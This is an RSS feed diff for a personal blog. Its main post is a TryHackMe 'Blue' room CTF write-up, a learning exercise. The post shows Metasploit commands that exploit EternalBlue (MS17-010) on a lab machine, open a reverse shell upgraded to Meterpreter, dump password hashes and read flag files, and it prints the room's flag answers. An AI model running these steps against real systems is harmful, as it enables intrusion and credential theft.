@@ -1,0 +1,106 @@
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+    <channel>
+        <title>Posts on Nod&#39;s Notes</title>
+        <link>http://localhost:1313/posts/</link>
+        <description>Recent content in Posts on Nod&#39;s Notes</description>
+        <generator>Hugo -- gohugo.io</generator>
+        <language>en</language>
+        <copyright>&lt;a href=&#34;https://creativecommons.org/licenses/by-nc/4.0/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;CC BY-NC 4.0&lt;/a&gt;</copyright>
+        <lastBuildDate>Mon, 22 Jul 2024 18:42:43 +1000</lastBuildDate>
+        <atom:link href="http://localhost:1313/posts/index.xml" rel="self" type="application/rss+xml" />
+        
+        <item>
+            <title>CTF Blue THM</title>
+            <link>http://localhost:1313/posts/2024/07/ctf-blue-thm/</link>
+            <pubDate>Mon, 22 Jul 2024 18:42:43 +1000</pubDate>
+            
+            <guid>http://localhost:1313/posts/2024/07/ctf-blue-thm/</guid>
+            <description>TryHackMe CTF: Blue Room Writeup
+https://tryhackme.com/r/room/blue
+Room Information
+This room was created by ben and DarkStar7471, members of the TryHackMe community. This is my second CTF, and I will document my thought process and actions as I go through the challenges.
+Initial Scanning
+I started by running an Nmap scan on the target IP address:
+sudo nmap -sC -sV -p- -T4 -vv 10.10.216.233 The Nmap scan revealed several open ports:</description>
+            <content type="html"><![CDATA[<p><strong>TryHackMe CTF: Blue Room Writeup</strong><br>
+<a href="https://tryhackme.com/r/room/blue">https://tryhackme.com/r/room/blue</a><br>
+<strong>Room Information</strong></p>
+<p>This room was created by ben and DarkStar7471, members of the TryHackMe community. This is my second CTF, and I will document my thought process and actions as I go through the challenges.</p>
+<p><strong>Initial Scanning</strong></p>
+<p>I started by running an Nmap scan on the target IP address:</p>
+<pre tabindex="0"><code>sudo nmap -sC -sV -p- -T4 -vv 10.10.216.233
+</code></pre><p>The Nmap scan revealed several open ports:</p>
+<pre tabindex="0"><code>PORT      STATE SERVICE            VERSION
+135/tcp   open  msrpc              Microsoft Windows RPC
+139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds       Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
+3389/tcp  open  ssl/ms-wbt-server?
+49152/tcp open  msrpc              Microsoft Windows RPC
+49153/tcp open  msrpc              Microsoft Windows RPC
+49154/tcp open  msrpc              Microsoft Windows RPC
+49158/tcp open  msrpc              Microsoft Windows RPC
+49159/tcp open  msrpc              Microsoft Windows RPC
+</code></pre><p>Notably, port 445 (SMB) is open, which suggests a possible vulnerability to MS17-010 (EternalBlue).</p>
+<p><strong>Exploitation with Metasploit</strong></p>
+<p>Given the SMB service running on port 445, I proceeded to use Metasploit to exploit the MS17-010 vulnerability.</p>
+<pre tabindex="0"><code>msfconsole
+search exploit/windows/smb/ms17_010_eternalblue
+use exploit/windows/smb/ms17_010_eternalblue
+show options
+set LHOST &lt;My_IP&gt;
+set RHOSTS 10.10.216.233
+run
+</code></pre><p>The exploit was successful, and I gained a command shell on the target machine:</p>
+<pre tabindex="0"><code>[*] Command shell session 1 opened (My_IP:4444 -&gt; 10.10.216.233:49242)
+</code></pre><p><strong>Upgrading to Meterpreter</strong></p>
+<p>To enhance my capabilities on the target, I upgraded the shell to a Meterpreter session:</p>
+<pre tabindex="0"><code>background
+search post/multi/manage/shell_to_meterpreter
+use post/multi/manage/shell_to_meterpreter
+show options
+set SESSION 1
+set LHOST &lt;My_IP&gt;
+set LPORT 4433
+run
+</code></pre><p>I confirmed the Meterpreter session:</p>
+<pre tabindex="0"><code>sessions -l
+</code></pre><p><strong>Privilege Escalation and Flag Discovery</strong></p>
+<p>Using Meterpreter, I listed running processes and migrated to a system-level process:</p>
+<pre tabindex="0"><code>ps
+migrate &lt;PID&gt;
+</code></pre><p>With system privileges, I dumped the password hashes:</p>
+<pre tabindex="0"><code>hashdump
+</code></pre><p>Cracking the hashes with CrackStation revealed the user credentials. I then located and retrieved the flags.</p>
+<p><strong>Flag 1</strong></p>
+<p>Located at the system root:</p>
+<pre tabindex="0"><code>meterpreter &gt; cd C:\
+meterpreter &gt; cat flag1.txt
+flag{access_the_machine}
+</code></pre><p><strong>Flag 2</strong></p>
+<p>Located where Windows stores passwords:</p>
+<pre tabindex="0"><code>meterpreter &gt; search -f flag2.txt
+meterpreter &gt; cat c:\Windows\System32\config\flag2.txt
+flag{sam_database_elevated_access}
+</code></pre><p><strong>Flag 3</strong></p>
+<p>Located in the user&rsquo;s documents:</p>
+<pre tabindex="0"><code>meterpreter &gt; search -f flag3.txt
+meterpreter &gt; cat c:\Users\Jon\Documents\flag3.txt
+flag{admin_documents_can_be_valuable}
+</code></pre><p><strong>Conclusion</strong></p>
+<p>This CTF was an excellent learning experience. I enhanced my skills with Metasploit, Meterpreter, and navigating Windows systems. I look forward to tackling more CTF challenges in the future.</p>
+]]></content>
+        </item>
+        
+        <item>
+            <title>Hello World.</title>
+            <link>http://localhost:1313/posts/2024/07/hello-world./</link>
+            <pubDate>Mon, 15 Jul 2024 14:09:52 +1000</pubDate>
+            
+            <guid>http://localhost:1313/posts/2024/07/hello-world./</guid>
+            <description>Welcome to my blog! This initial post serves as a test to ensure everything is functioning correctly. Stay tuned for more updates and content.</description>
+            <content type="html"><![CDATA[<p>Welcome to my blog! This initial post serves as a test to ensure everything is functioning correctly. Stay tuned for more updates and content.</p>
+]]></content>
+        </item>
+        
+    </channel>
+</rss>
